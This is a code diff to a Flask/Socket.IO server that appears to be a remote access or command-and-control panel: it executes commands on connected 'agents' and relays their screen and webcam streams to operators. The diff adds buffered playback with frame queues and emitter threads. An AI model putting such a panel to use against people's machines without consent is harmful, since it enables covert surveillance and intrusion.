@@ -27,7 +27,7 @@ from markupsafe import escape
 from models import SessionLocal, engine, Base, Agent as DbAgent, CommandHistory as DbCommandHistory, ActivityLog as DbActivityLog, AgentGroup as DbAgentGroup, AgentGroupMembership as DbAgentGroupMembership, AuditLog as DbAuditLog
 from apscheduler.schedulers.background import BackgroundScheduler
 LIMITER_AVAILABLE = False
-from collections import defaultdict
+from collections import defaultdict, deque
 import datetime
 import time
 import os
@@ -3764,19 +3764,37 @@ def start_stream(agent_id, stream_type):
         return jsonify({'error': 'Agent not connected'}), 400
     
     quality = request.json.get('quality', 'high') if request.is_json else 'high'
+    mode = request.json.get('mode', 'realtime') if request.is_json else 'realtime'
+    fps = int(request.json.get('fps', 10)) if request.is_json else 10
+    buffer_frames = int(request.json.get('buffer_frames', 30)) if request.is_json else 30
     
     # Emit to agent
     socketio.emit('start_stream', {
         'type': stream_type,
         'quality': quality
     }, room=agent_sid)
+    if stream_type == 'screen':
+        STREAM_PLAYBACK_MODE_SCREEN[agent_id] = mode
+        STREAM_PLAYBACK_FPS_SCREEN[agent_id] = fps
+        STREAM_BUFFER_FRAMES_SCREEN[agent_id] = buffer_frames
+        if mode == 'buffered':
+            _ensure_buffered_emitter(agent_id, 'screen')
+    elif stream_type == 'camera':
+        STREAM_PLAYBACK_MODE_CAMERA[agent_id] = mode
+        STREAM_PLAYBACK_FPS_CAMERA[agent_id] = fps
+        STREAM_BUFFER_FRAMES_CAMERA[agent_id] = buffer_frames
+        if mode == 'buffered':
+            _ensure_buffered_emitter(agent_id, 'camera')
     
     return jsonify({
         'success': True,
         'message': f'{stream_type.title()} stream started',
         'agent_id': agent_id,
         'stream_type': stream_type,
-        'quality': quality
+        'quality': quality,
+        'mode': mode,
+        'fps': fps,
+        'buffer_frames': buffer_frames
     })
 
 @app.route('/api/agents/<agent_id>/stream/<stream_type>/stop', methods=['POST'])
@@ -3797,6 +3815,12 @@ def stop_stream(agent_id, stream_type):
     socketio.emit('stop_stream', {
         'type': stream_type
     }, room=agent_sid)
+    if stream_type == 'screen':
+        STREAM_PLAYBACK_MODE_SCREEN[agent_id] = 'realtime'
+        STREAM_FRAME_BUFFER_SCREEN[agent_id].clear()
+    elif stream_type == 'camera':
+        STREAM_PLAYBACK_MODE_CAMERA[agent_id] = 'realtime'
+        STREAM_FRAME_BUFFER_CAMERA[agent_id].clear()
     
     return jsonify({
         'success': True,
@@ -3804,6 +3828,32 @@ def stop_stream(agent_id, stream_type):
         'agent_id': agent_id,
         'stream_type': stream_type
     })
+
+@socketio.on('set_stream_mode')
+def handle_set_stream_mode(data):
+    agent_id = str(data.get('agent_id') or '')
+    stream_type = str(data.get('type') or 'screen')
+    mode = str(data.get('mode') or 'realtime')
+    fps = int(data.get('fps') or 10)
+    buffer_frames = int(data.get('buffer_frames') or 30)
+    if not agent_id:
+        return
+    if stream_type == 'screen':
+        STREAM_PLAYBACK_MODE_SCREEN[agent_id] = mode
+        STREAM_PLAYBACK_FPS_SCREEN[agent_id] = fps
+        STREAM_BUFFER_FRAMES_SCREEN[agent_id] = buffer_frames
+        if mode == 'buffered':
+            _ensure_buffered_emitter(agent_id, 'screen')
+        else:
+            STREAM_FRAME_BUFFER_SCREEN[agent_id].clear()
+    elif stream_type == 'camera':
+        STREAM_PLAYBACK_MODE_CAMERA[agent_id] = mode
+        STREAM_PLAYBACK_FPS_CAMERA[agent_id] = fps
+        STREAM_BUFFER_FRAMES_CAMERA[agent_id] = buffer_frames
+        if mode == 'buffered':
+            _ensure_buffered_emitter(agent_id, 'camera')
+        else:
+            STREAM_FRAME_BUFFER_CAMERA[agent_id].clear()
 
 # Command Execution API
 @app.route('/api/agents/<agent_id>/execute', methods=['POST'])
@@ -6450,6 +6500,69 @@ STREAM_CHUNK_SIZE_DEFAULT = 16 * 1024
 STREAM_BIN_CHUNK_SIZE_DEFAULT = 32 * 1024
 STREAM_CHUNK_SIZES = defaultdict(lambda: STREAM_CHUNK_SIZE_DEFAULT)
 STREAM_BIN_CHUNK_SIZES = defaultdict(lambda: STREAM_BIN_CHUNK_SIZE_DEFAULT)
+STREAM_PLAYBACK_MODE_SCREEN = defaultdict(lambda: 'realtime')
+STREAM_PLAYBACK_MODE_CAMERA = defaultdict(lambda: 'realtime')
+STREAM_PLAYBACK_FPS_SCREEN = defaultdict(lambda: 10)
+STREAM_PLAYBACK_FPS_CAMERA = defaultdict(lambda: 10)
+STREAM_BUFFER_FRAMES_SCREEN = defaultdict(lambda: 30)
+STREAM_BUFFER_FRAMES_CAMERA = defaultdict(lambda: 30)
+STREAM_FRAME_BUFFER_SCREEN = defaultdict(lambda: deque(maxlen=300))
+STREAM_FRAME_BUFFER_CAMERA = defaultdict(lambda: deque(maxlen=300))
+STREAM_EMITTER_THREADS_SCREEN = {}
+STREAM_EMITTER_THREADS_CAMERA = {}
+
+def _ensure_buffered_emitter(agent_id: str, stream_type: str):
+    try:
+        if stream_type == 'screen':
+            thr = STREAM_EMITTER_THREADS_SCREEN.get(agent_id)
+            if thr and thr.is_alive():
+                return
+            fps = max(1, int(STREAM_PLAYBACK_FPS_SCREEN[agent_id] or 10))
+            buf_frames = max(1, int(STREAM_BUFFER_FRAMES_SCREEN[agent_id] or 30))
+            def _run():
+                started = False
+                while STREAM_PLAYBACK_MODE_SCREEN[agent_id] == 'buffered':
+                    buf = STREAM_FRAME_BUFFER_SCREEN[agent_id]
+                    if not started:
+                        if len(buf) >= buf_frames:
+                            started = True
+                        else:
+                            time.sleep(0.05)
+                            continue
+                    if buf:
+                        b64 = buf.popleft()
+                        emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
+                    time.sleep(1.0 / float(fps))
+                STREAM_EMITTER_THREADS_SCREEN.pop(agent_id, None)
+            t = threading.Thread(target=_run, daemon=True)
+            STREAM_EMITTER_THREADS_SCREEN[agent_id] = t
+            t.start()
+        elif stream_type == 'camera':
+            thr = STREAM_EMITTER_THREADS_CAMERA.get(agent_id)
+            if thr and thr.is_alive():
+                return
+            fps = max(1, int(STREAM_PLAYBACK_FPS_CAMERA[agent_id] or 10))
+            buf_frames = max(1, int(STREAM_BUFFER_FRAMES_CAMERA[agent_id] or 30))
+            def _run():
+                started = False
+                while STREAM_PLAYBACK_MODE_CAMERA[agent_id] == 'buffered':
+                    buf = STREAM_FRAME_BUFFER_CAMERA[agent_id]
+                    if not started:
+                        if len(buf) >= buf_frames:
+                            started = True
+                        else:
+                            time.sleep(0.05)
+                            continue
+                    if buf:
+                        b64 = buf.popleft()
+                        emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
+                    time.sleep(1.0 / float(fps))
+                STREAM_EMITTER_THREADS_CAMERA.pop(agent_id, None)
+            t = threading.Thread(target=_run, daemon=True)
+            STREAM_EMITTER_THREADS_CAMERA[agent_id] = t
+            t.start()
+    except Exception:
+        pass
 
 @socketio.on('screen_frame')
 def handle_screen_frame(data):
@@ -6470,42 +6583,44 @@ def handle_screen_frame(data):
             b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
         else:
             return
-        # Chunk and emit small packets (base64)
-        STREAM_FRAME_SEQ[agent_id] += 1
-        fid = STREAM_FRAME_SEQ[agent_id]
-        total_size = len(b64)
-        chunk_size = STREAM_CHUNK_SIZES[agent_id]
-        if total_size <= chunk_size:
-            emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
-            return
-        for off in range(0, total_size, chunk_size):
-            chunk = b64[off:off + chunk_size]
-            emit('screen_frame_chunk', {
-                'agent_id': agent_id,
-                'frame_id': fid,
-                'chunk': chunk,
-                'offset': off,
-                'total_size': total_size
-            }, room='operators')
-        # Also emit binary chunks (preferred on modern clients)
-        try:
-            if isinstance(frame, str):
-                raw = base64.b64decode(b64)
-            else:
-                raw = bytes(frame)
-            total_bin = len(raw)
-            bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
-            for off in range(0, total_bin, bin_size):
-                chunk = raw[off:off + bin_size]
-                emit('screen_frame_bin_chunk', {
+        if STREAM_PLAYBACK_MODE_SCREEN[agent_id] == 'buffered':
+            STREAM_FRAME_BUFFER_SCREEN[agent_id].append(b64)
+            _ensure_buffered_emitter(agent_id, 'screen')
+        else:
+            STREAM_FRAME_SEQ[agent_id] += 1
+            fid = STREAM_FRAME_SEQ[agent_id]
+            total_size = len(b64)
+            chunk_size = STREAM_CHUNK_SIZES[agent_id]
+            if total_size <= chunk_size:
+                emit('screen_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
+                return
+            for off in range(0, total_size, chunk_size):
+                chunk = b64[off:off + chunk_size]
+                emit('screen_frame_chunk', {
                     'agent_id': agent_id,
                     'frame_id': fid,
                     'chunk': chunk,
                     'offset': off,
-                    'total_size': total_bin
+                    'total_size': total_size
                 }, room='operators')
-        except Exception as _e:
-            pass
+            try:
+                if isinstance(frame, str):
+                    raw = base64.b64decode(b64)
+                else:
+                    raw = bytes(frame)
+                total_bin = len(raw)
+                bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
+                for off in range(0, total_bin, bin_size):
+                    chunk = raw[off:off + bin_size]
+                    emit('screen_frame_bin_chunk', {
+                        'agent_id': agent_id,
+                        'frame_id': fid,
+                        'chunk': chunk,
+                        'offset': off,
+                        'total_size': total_bin
+                    }, room='operators')
+            except Exception:
+                pass
     except Exception as e:
         print(f"Error handling screen_frame for {agent_id}: {e}")
 
@@ -6580,41 +6695,44 @@ def handle_camera_frame(data):
             b64 = s.split(',', 1)[1] if s.startswith('data:') and ',' in s else s
         else:
             return
-        STREAM_FRAME_SEQ[agent_id] += 1
-        fid = STREAM_FRAME_SEQ[agent_id]
-        total_size = len(b64)
-        chunk_size = STREAM_CHUNK_SIZES[agent_id]
-        if total_size <= chunk_size:
-            emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
-            return
-        for off in range(0, total_size, chunk_size):
-            chunk = b64[off:off + chunk_size]
-            emit('camera_frame_chunk', {
-                'agent_id': agent_id,
-                'frame_id': fid,
-                'chunk': chunk,
-                'offset': off,
-                'total_size': total_size
-            }, room='operators')
-        # Also emit binary chunks (preferred on modern clients)
-        try:
-            if isinstance(frame, str):
-                raw = base64.b64decode(b64)
-            else:
-                raw = bytes(frame)
-            total_bin = len(raw)
-            bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
-            for off in range(0, total_bin, bin_size):
-                chunk = raw[off:off + bin_size]
-                emit('camera_frame_bin_chunk', {
+        if STREAM_PLAYBACK_MODE_CAMERA[agent_id] == 'buffered':
+            STREAM_FRAME_BUFFER_CAMERA[agent_id].append(b64)
+            _ensure_buffered_emitter(agent_id, 'camera')
+        else:
+            STREAM_FRAME_SEQ[agent_id] += 1
+            fid = STREAM_FRAME_SEQ[agent_id]
+            total_size = len(b64)
+            chunk_size = STREAM_CHUNK_SIZES[agent_id]
+            if total_size <= chunk_size:
+                emit('camera_frame', {'agent_id': agent_id, 'frame': b64}, room='operators')
+                return
+            for off in range(0, total_size, chunk_size):
+                chunk = b64[off:off + chunk_size]
+                emit('camera_frame_chunk', {
                     'agent_id': agent_id,
                     'frame_id': fid,
                     'chunk': chunk,
                     'offset': off,
-                    'total_size': total_bin
+                    'total_size': total_size
                 }, room='operators')
-        except Exception as _e:
-            pass
+            try:
+                if isinstance(frame, str):
+                    raw = base64.b64decode(b64)
+                else:
+                    raw = bytes(frame)
+                total_bin = len(raw)
+                bin_size = STREAM_BIN_CHUNK_SIZES[agent_id]
+                for off in range(0, total_bin, bin_size):
+                    chunk = raw[off:off + bin_size]
+                    emit('camera_frame_bin_chunk', {
+                        'agent_id': agent_id,
+                        'frame_id': fid,
+                        'chunk': chunk,
+                        'offset': off,
+                        'total_size': total_bin
+                    }, room='operators')
+            except Exception:
+                pass
     except Exception as e:
         print(f"Error handling camera_frame for {agent_id}: {e}")
 
